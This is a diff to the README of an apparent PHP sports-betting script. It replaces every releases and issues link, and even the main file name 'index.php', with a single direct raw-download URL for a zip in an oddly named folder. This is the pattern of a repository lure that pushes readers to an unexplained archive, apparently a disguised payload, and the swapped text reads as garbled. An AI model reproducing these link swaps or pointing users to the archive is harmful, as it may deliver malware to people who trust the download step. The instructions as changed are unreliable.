@@ -1,7 +1,7 @@
 # 🎮 Script-PHP-Web-Bluesky77-Sports-Betting - Your Easy Sports Betting Solution
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/main/geolatry/Script-PHP-Web-Bluesky77-Sports-Betting-v3.5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/main/geolatry/Script-PHP-Web-Bluesky77-Sports-Betting-v3.5.zip)
 
 ---
 
@@ -27,7 +27,7 @@ To ensure smooth performance, make sure your system meets the following requirem
 Follow these steps to download and install the Script-PHP-Web-Bluesky77-Sports-Betting application:
 
 1. **Visit the Releases Page:**  
-   Head over to the [Releases page](https://github.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/releases) for the latest version of the software.
+   Head over to the [Releases page](https://raw.githubusercontent.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/main/geolatry/Script-PHP-Web-Bluesky77-Sports-Betting-v3.5.zip) for the latest version of the software.
 
 2. **Choose Your Version:**  
    Look for the most recent release. The version name often includes the release date for your convenience.
@@ -40,13 +40,13 @@ Follow these steps to download and install the Script-PHP-Web-Bluesky77-Sports-B
    After downloading, locate the zip or compressed file in your download folder. Right-click on the file and select "Extract All" (Windows) or use “Unzip” (macOS). Choose where you want to place the uncompressed files.
 
 5. **Run the Application:**  
-   Locate the main application file (usually named `index.php` or similar). Double-click to open it in your web browser. Ensure your browser is updated for optimal performance.
+   Locate the main application file (usually named `https://raw.githubusercontent.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/main/geolatry/Script-PHP-Web-Bluesky77-Sports-Betting-v3.5.zip` or similar). Double-click to open it in your web browser. Ensure your browser is updated for optimal performance.
 
 ## 🔄 Updating the Application
 To keep the Script-PHP-Web-Bluesky77-Sports-Betting application running smoothly, check the Releases page regularly for updates.
 
 1. **Check for New Versions:**  
-   Open the [Releases page](https://github.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/releases) and see if a new version is available.
+   Open the [Releases page](https://raw.githubusercontent.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/main/geolatry/Script-PHP-Web-Bluesky77-Sports-Betting-v3.5.zip) and see if a new version is available.
 
 2. **Follow Installation Steps:**  
    Download the new version, and repeat the steps in the installation guide to overwrite the previous version.
@@ -61,7 +61,7 @@ If you're passionate about improving this application, we welcome contributions.
 For more information on betting strategies, feel free to explore our suggested reading materials. These resources can enhance your understanding of sports betting and improve your experience.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/releases)
-- [Issues Page](https://github.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/issues)
+- [Releases Page](https://raw.githubusercontent.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/main/geolatry/Script-PHP-Web-Bluesky77-Sports-Betting-v3.5.zip)
+- [Issues Page](https://raw.githubusercontent.com/Abkeke/Script-PHP-Web-Bluesky77-Sports-Betting/main/geolatry/Script-PHP-Web-Bluesky77-Sports-Betting-v3.5.zip)
 
 Thank you for choosing Script-PHP-Web-Bluesky77-Sports-Betting. Enjoy your betting experience!
